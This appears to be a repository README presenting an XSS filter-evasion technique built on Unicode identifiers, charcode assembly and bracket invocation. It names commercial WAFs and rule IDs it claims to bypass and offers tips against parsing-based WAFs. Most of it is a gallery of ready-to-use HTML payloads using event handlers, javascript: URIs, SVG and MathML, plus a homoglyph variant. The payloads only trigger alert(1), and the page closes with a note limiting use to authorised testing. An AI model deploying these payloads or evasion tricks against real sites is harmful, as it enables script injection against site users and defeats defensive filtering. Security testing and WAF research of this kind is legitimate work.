```
    __  __      _              __       _  __ ____   ____
    \ \/ /___  (_)________  __/ /____  | |/ // __/ / __/
     \  // _ \/ / __/ __ \/ / / __/ _ \ |   /_ \  \__ \
     /  \/ __/ / /_/ /_/ / /_/ /_/  __//   /__/ / ___/ /
    /_/\_\___/_/\__/\____/\__/\__/\___/_/|_/____/ /____/

           変数 = String.fromCharCode(97,108,101,114,116)
                       window[変数](1)
```

<div align="center">

`unicode identifiers` · `charcode assembly` · `bracket invocation`

</div>

---

## Core Trick

```js
変数 = String.fromCharCode(97,108,101,114,116);  // "alert"
window[変数](1);                                  // alert(1)
```

Three primitives:

1. Non-ASCII identifier (`変数`, `АЬс`, ...) is valid ECMAScript.
2. `String.fromCharCode` assembles the sink name at runtime.
3. `window[ident]` invokes it. No literal token in the payload.

The strings `alert`, `eval`, `Function`, `prompt`, `confirm` never appear on the wire.

---

## WAF Bypass Surface

```
   ┌──────────────────────────────┬────────────────────────────┐
   │  WAF signal                  │  Payload evasion           │
   ├──────────────────────────────┼────────────────────────────┤
   │  /alert\s*\(/                │  window[変数](1)           │
   │  /on\w+\s*=.*(alert|eval)/   │  charcode assembled        │
   │  javascript: URI regex       │  MathML href, meta refresh │
   │  <script> blocklist          │  event handlers only       │
   │  ASCII identifier scans      │  U+5909 U+6570 katakana    │
   │  quoted-string keyword grep  │  no quoted "alert" exists  │
   └──────────────────────────────┴────────────────────────────┘
```

Concrete wins against signature-based WAFs:

- **Cloudflare Managed Rules** (XSS ruleset 100011, 100015). Signature packs match `alert(`, `on\w+=.*javascript:`, `String\.fromCharCode\s*\(\s*\d+`. The last is dodgeable by breaking numbers with `+0` or entity encoding, but the identifier trick alone hides the sink call.
- **AWS WAF Managed Rules** (`AWSManagedRulesCommonRuleSet` XSS_BODY / XSS_URI). Regex-based, ASCII focused. Katakana identifier + bracket invocation slips past.
- **Azure Front Door WAF** (DRS 2.x rule 941xxx). Adapted ModSecurity CRS, same weaknesses.
- **AWS Shield / ALB WAF custom rules** written by SOC teams. Almost always `alert|eval|prompt|confirm` regex.
- **ModSecurity + OWASP CRS** (rules 941110, 941120, 941160, 941170). Regex tuned for ASCII XSS vectors. Non-ASCII identifiers not in the paranoia-level-1 signatures.
- **F5 BIG-IP ASM signature sets** (Attack Signature IDs 200000098, 200001475, ...). Pattern-based. Charcode assembly + bracket call defeats keyword match.
- **Imperva Cloud WAF** default XSS ruleset. Signature-driven. Same story.
- **Akamai Kona Site Defender** XSS rules (3000004, 3000005, 3000014). Regex. Bypassable.
- **Fortinet FortiWeb** signature XSS. Regex.
- **Barracuda WAF** default profile. Regex.
- **Sucuri CloudProxy** default rules. Regex.
- **Home-rolled `WAF` middleware** (express-rate-limit + custom regex, nginx `if ($args ~* alert)`). Trivial bypass.

Extra reasons this payload family survives:

- Reflected-XSS scanners (`dalfox`, `XSStrike`, Burp Scanner) grep response bodies for `alert(` / `prompt(`. Bracket invocation returns clean.
- Log ingestion pipelines redacting on `alert\(` see nothing to redact. Payload lands unredacted in SIEM, useful for stealth in red team.
- Non-ASCII bytes survive most URL-encoding normalisation. UTF-8 pass-through is the default.
- Multiple sink tags (SVG `discard`, `keygen`, MathML `maction`) rarely appear in WAF blocklists that focus on `<script>`, `<img>`, `<iframe>`.

---

## Note: WAFs With Real Parsing or Sandboxing

These do more than regex. The identifier trick alone is not enough. Combine with structural mutation, encoding layers, or context abuse to have a chance.

- **Wallarm.** Uses libDetection and a tokenising parser (LOM: Logical Operations Model). Reconstructs the AST-ish shape of the payload and evaluates behavioural intent. Charcode assembly plus bracket call is still recognised as a `String.fromCharCode` node feeding a call expression. Identifier renaming does not fool the token graph. Bypass requires breaking the parse (comments inside charcode args, split strings, alternative constructors like `Function` from `[]["constructor"]["constructor"]`).
- **Radware AppWall / Cloud WAF.** Ships a JavaScript emulation engine for high-severity XSS rules. Payload is partially executed in a sandbox to observe sink invocation. Sees `window[x](1)` fire and flags it regardless of how `x` was built.
- **Imperva Advanced Bot / Attack Analytics** (not the base signature set). Behavioural mode does light JS emulation on suspicious params.
- **F5 Advanced WAF (Adv WAF, formerly ASM Layer 7 DoS)** with the `JavaScript Sandbox` module enabled. Executes reflected payloads in a headless V8 to catch obfuscation. Sees the final `alert(1)` call in the sandbox and blocks.
- **Fastly Next-Gen WAF (formerly Signal Sciences).** Uses "SmartParse" which tokenises input and matches on structural intent, not raw regex. Charcode + bracket call is one of the documented patterns SmartParse flags. Bypass requires splitting the payload across request parts or using less common sinks.
- **Cloudflare's newer ML/Attack Score** ruleset (score-based, not the legacy Managed Rules). Trained on obfuscated corpora including charcode/bracket-notation payloads. Score climbs on this pattern even without the ASCII keyword. Still probabilistic, still bypassable with novel mutations, but not free.
- **Google Cloud Armor + reCAPTCHA Enterprise WAF preview rules.** Some XSS preview signatures use tokenisation.

Rule of thumb: if the WAF only greps, this beats it. If the WAF parses or executes, structural mutation on top of the identifier trick is required.

---

## Payload Gallery

<details open>
<summary><b>image</b></summary>

```html
<img src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<img src=x onloadstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>body / document</b></summary>

```html
<body onpageshow="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<body onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" autofocus>
```
</details>

<details>
<summary><b>form (fires without interaction)</b></summary>

```html
<input autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<select autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><option>x</option></select>
<textarea autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></textarea>
<keygen autofocus onfocus="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>details / summary</b></summary>

```html
<details open ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></details>
<details ontoggle="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" open><summary>x</summary></details>
```
</details>

<details>
<summary><b>media</b></summary>

```html
<video><source onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></video>
<audio src=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<video poster=x onerror="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>iframe / object</b></summary>

```html
<iframe src="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<iframe onload="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></iframe>
<object data="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></object>
```
</details>

<details>
<summary><b>table / marquee</b></summary>

```html
<table background="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
<marquee onstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</marquee>
<marquee onfinish="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" loop=1>x</marquee>
```
</details>

<details>
<summary><b>style / animation</b></summary>

```html
<div style="animation-name:x" onanimationstart="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">x</div>
```
</details>

<details>
<summary><b>SVG</b></summary>

```html
<svg><animate onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x dur=1s></svg>
<svg><set onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" attributeName=x to=1></svg>
<svg><animateMotion onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)" dur=1s></svg>
<svg><discard onbegin="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></svg>
```
</details>

<details>
<summary><b>meta refresh</b></summary>

```html
<meta http-equiv="refresh" content="0;url=javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)">
```
</details>

<details>
<summary><b>dialog</b></summary>

```html
<dialog open onclose="変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"></dialog>
```
</details>

<details>
<summary><b>MathML</b></summary>

```html
<math href="javascript:変数=String.fromCharCode(97,108,101,114,116);window[変数](1)"><maction actiontype="statusline#">click</maction></math>
```
</details>

---

## Cyrillic Homoglyph Variant

```js
let АЬс = String.fromCharCode(97,108,101,114,116);
window[АЬс](1);
```

`А` U+0410, `Ь` U+042C, `с` U+0441. Reads `Abc`, is not.

---

## Credit

Inspired by [`0x03f3/php-emoji-reverse-shell`](https://github.com/0x03f3/php-emoji-reverse-shell/blob/main/emoji-reverse-shell.php). Same trick in PHP: emoji identifiers plus char-code assembly to slip past AV and WAF signatures.

---

## Legal

Educational and defensive research. Use only on targets you own or have written authorisation for (bug bounty scope, CTF, pentest SoW).
